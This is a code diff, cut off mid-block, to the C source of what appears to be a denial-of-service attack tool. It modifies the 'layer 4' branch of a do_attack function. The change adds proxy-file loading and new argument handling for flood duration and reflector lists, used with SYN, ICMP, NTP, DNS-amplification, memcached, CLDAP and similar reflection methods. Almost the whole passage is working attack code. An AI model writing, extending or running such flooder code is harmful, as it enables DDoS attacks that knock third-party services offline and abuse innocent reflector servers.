@@ -1050,24 +1050,63 @@ static void do_attack(int argc, char **argv) {
         _exit(0);
 
     } else if (is_layer4(method)) {
-        if (argc < 4) _exit(1);
+        /*
+         * L4 command formats:
+         *   With proxies:    METHOD TARGET PROXY_TYPE PROXY_FILE DURATION [REFLECTORS]
+         *                    argv:  [1]    [2]    [3]        [4]      [5]     [6]
+         *   Without proxies: METHOD TARGET DURATION [REFLECTORS]
+         *                    argv:  [1]    [2]    [3]      [4]
+         *
+         * Detection: if argc >= 6 and argv[3] is a single digit (proxy type), it's proxy format
+         */
+        int has_proxies = 0;
+        int proxy_ty_l4 = 0;
+        char proxy_path_l4[512] = {0};
+        int timer_arg_idx = 3;
+        int reflector_arg_idx = 4;
+
+        if (argc >= 6 && strlen(argv[3]) == 1 && argv[3][0] >= '0' && argv[3][0] <= '9') {
+            has_proxies = 1;
+            proxy_ty_l4 = atoi(argv[3]);
+            snprintf(proxy_path_l4, sizeof(proxy_path_l4), "files/proxies/%s", argv[4]);
+            timer_arg_idx = 5;
+            reflector_arg_idx = 6;
+            if (argc < 6) _exit(1);
+        } else {
+            if (argc < 4) _exit(1);
+        }
+
         parse_url(url, &target);
         if (!resolve_host(target.host, target_ip, sizeof(target_ip))) _exit(1);
         port = target.port;
         if (port < 1 || port > 65535) _exit(1);
-        timer = atoi(argv[3]);
+        timer = atoi(argv[timer_arg_idx]);
         if ((method == METHOD_SYN || method == METHOD_ICMP || method == METHOD_NTP ||
              method == METHOD_DNS_AMP || method == METHOD_RDP || method == METHOD_CHAR ||
              method == METHOD_MEM || method == METHOD_CLDAP || method == METHOD_ARD) &&
             !check_raw_socket()) _exit(1);
-        if (argc >= 5 && strlen(argv[4]) > 0) {
-            char *a4 = argv[4];
+
+        /* Load proxies for L4 if provided */
+        if (has_proxies && proxy_ty_l4 != 0 && strcmp(argv[4], "none") != 0) {
+            proxy_type_t pt_l4 = (proxy_type_t)proxy_ty_l4;
+            if (pt_l4 == PROXY_RANDOM) pt_l4 = (proxy_type_t)(1 + (rand() % 3));
+            proxy_t *pa = malloc(sizeof(proxy_t) * MAX_PROXIES);
+            if (pa) {
+                proxy_cnt = load_proxies(proxy_path_l4, pa, MAX_PROXIES, pt_l4);
+                if (proxy_cnt > 0) proxies = pa;
+                else free(pa);
+            }
+        }
+
+        /* Load reflectors if present */
+        if (argc > reflector_arg_idx && strlen(argv[reflector_arg_idx]) > 0) {
+            char *refl_arg = argv[reflector_arg_idx];
             if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
                 method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP ||
                 method == METHOD_ARD) {
                 char rp[512];
                 FILE *rf;
-                snprintf(rp, sizeof(rp), "files/%s", a4);
+                snprintf(rp, sizeof(rp), "files/%s", refl_arg);
                 rf = fopen(rp, "r");
                 if (rf) {
                     char line[256];
